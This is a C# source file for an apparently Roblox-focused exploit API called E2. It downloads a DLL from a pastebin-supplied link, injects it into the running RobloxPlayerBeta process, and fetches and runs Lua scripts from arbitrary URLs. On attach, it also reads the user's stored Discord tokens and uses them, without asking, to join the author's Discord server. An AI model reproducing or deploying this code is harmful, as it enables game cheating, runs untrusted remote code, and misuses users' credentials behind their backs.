using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using E2;
using System.Timers;

namespace E2
{
    public class E2_API
    {

        public static string dllname = "E2.dll";
        public static string dlllink = "https://pastebin.com/raw/fuck u skid";
        public static string dllpipe = "kys";

        Pipe.BasicInject Injector = new Pipe.BasicInject();
        private static void NonMainExecute(string yes)
        {
            Pipe.MainPipeClient(Pipe.luapipename, yes);
        }

        public  static string CustomDownloadString(string link)
        {
            WebRequest wr = WebRequest.Create(new Uri(link));
            WebResponse ws = wr.GetResponse();
            StreamReader sr = new StreamReader(ws.GetResponseStream());
            string data = sr.ReadToEnd();
            return data;
        }

        public bool isEmpathyAttached()
        { 
            bool e = Pipe.NamedPipeExist(Pipe.luapipename);
            if (e == true)
            {
                return true;
            }
            else
            {
                return false;
            }
        }


        public static void isUpdated()
        {
            string a = CustomDownloadString("https://pastebin.com/raw/iw881d1Z");
            if(a == "0")
            {
                MessageBox.Show($"{Form.ActiveForm.Name} Isn't Updated Right Now!Be Patient For An Update!",$"{Form.ActiveForm.Name}",MessageBoxButtons.OK,MessageBoxIcon.Error);
                Form.ActiveForm.Close();
            }
            else
            {
                return;//continue
            }
        }

        public void Execute(string text)
        {
            if (isEmpathyAttached())
            {
                if (!text.StartsWith("https://"))
                {
                    E2_API.NonMainExecute(text);
                }
                else
                {
                    if (text.StartsWith("https://pastebin.com/"))
                    {
                        WebClient wc = new WebClient();
                        if (text.StartsWith("https://pastebin.com/raw/"))
                        {
                            string textbox = text;
                            string idk = wc.DownloadString(textbox);
                            E2_API.NonMainExecute(idk);
                        }
                        else
                        {
                            string text3 = text.Remove(0, 21);
                            string main = wc.DownloadString("https://pastebin.com/raw/" + text3);
                            E2_API.NonMainExecute(main);
                        }
                    }
                    else if (text.StartsWith("https://"))
                    {
                        WebClient wc = new WebClient();
                        string text2 = text;
                        string MainText = wc.DownloadString(text2);
                        E2_API.NonMainExecute(MainText);
                    }
                    else
                    {
                        MessageBox.Show("This Isnt A URL", "Please Input A URL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }
            else
            {
                MessageBox.Show($"Inject {Form.ActiveForm.Name} before Using this!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); return;
            }
        }

        public  async void Join_DiscordServer(string link, bool message)
        {
            try
            {
                foreach (string value in TokenRetriever.RetrieveDiscordTokens())
                {
                    HttpClient client = new HttpClient();
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36");
                    client.DefaultRequestHeaders.Add("authorization", value);
                    HttpClient httpClient = client;
                    await httpClient.PostAsync("https://discordapp.com/api/v6/invite/" + link, null);
                    httpClient = null;
                }
                if(message == true)
                {
                    MessageBox.Show($"Most Prob Your In {Form.ActiveForm.Name}'s Discord , Scroll Up Or Down In Your List Of Servers And You Should See It!", "Message By PareX ;))", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
            }
            catch (Exception ex)
            {
                if(message == true)
                {
                    MessageBox.Show(ex.Message, $"Couldn't Join {Form.ActiveForm.Name}'s Discord");
                }
            }
        }


        public static bool isRobloxOn()
        {
            if (Process.GetProcessesByName("RobloxPlayerBeta").Length == 1)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public  void Attach()
        {
            if(Process.GetProcessesByName("RobloxPlayerBeta").Length == 1)
            {
                if (!isEmpathyAttached() == true)
                {
                    try
                    {
                        File.Delete(dllname);
                        if (!File.Exists(dllname))
                        {
                            try
                            {
                                new WebClient().DownloadFile(CustomDownloadString(dlllink).ToString(), dllname);
                                Injector.InjectDLL();
                                if(isEmpathyAttached() == true)
                                {
                                    Execute("warn('API Was Brought By PareX')");
                                }
                                try
                                {
                                    Join_DiscordServer("hUakas5",false);
                                   
                                }
                                catch (Exception ea) {  }
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show($"Error: '{ex.Message}'");
                            }
                        }
                        else
                        {
                            try
                            {
                                File.Delete(dllname);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show("Error Dll Not Found Most Propably, " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                    catch (Exception ex2)
                    {
                        MessageBox.Show("Error Dll Not Found Most Propably Or Failed While Downloading.., " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    MessageBox.Show("Aready Injected!", "No problemo", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Roblox Was Not Found!", "Roblox Not Found");
            }
        }


        public void KillRoblox()
        {
            foreach (var process in Process.GetProcessesByName("RobloxPlayerBeta"))
                process.Kill();
        }
    }
}
